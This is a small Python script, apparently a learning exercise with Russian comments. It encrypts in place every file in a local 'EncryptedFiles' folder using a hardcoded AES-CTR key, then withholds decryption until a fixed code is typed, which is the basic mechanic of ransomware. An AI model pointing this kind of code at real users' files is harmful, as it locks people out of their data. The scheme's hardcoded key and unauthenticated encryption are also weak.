# /// script
# requires-python = ">=3.10"
# dependencies = ["scapy", "cryptography"]
# ///

from pathlib import Path
import cryptography
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

CHUNK_SIZE = 65536

key = b"Spring is coming"

def encryptFile(f_path, key):
    with open(f_path, "r+b") as f:
        nonce = os.urandom(16) # здесь строго 16
        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
        # здесь 1 nonce на весь файл, который внутри скрипта будет суммироваться
        # для каждого блока. Также нет тегов
        encryptor = cipher.encryptor()
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk: break
            enc_chunk = encryptor.update(chunk)
            f.seek(-len(chunk), 1) 
            f.write(enc_chunk)
        f.write(encryptor.finalize())
        f.write(nonce)

def decryptFile(f_path, key):
    f_size = os.path.getsize(f_path)
    with open(f_path, "r+b") as f:
        f.seek(-16, 2) # 2 это типо с конца файла
        nonce = f.read(16)
        f.truncate(f_size - 16) # truncate усекает файл до указанного размера
        f.seek(0)

        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
        decryptor = cipher.decryptor()

        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break 
            f.seek(-len(chunk), 1)
            f.write(decryptor.update(chunk))
        f.write(decryptor.finalize())


directory = Path(__file__).resolve().parent / "EncryptedFiles"
files = [p for p in directory.rglob("*") if p.is_file()]

# glob только в текущей
# rglob смотрит все папки

for f_name in files:
    encryptFile(f_name, key)

while True:
    print("Enter Decryption Code")
    code = input().strip()
    if code == "DF":
        for f_name in files:
            decryptFile(f_name, key)
        break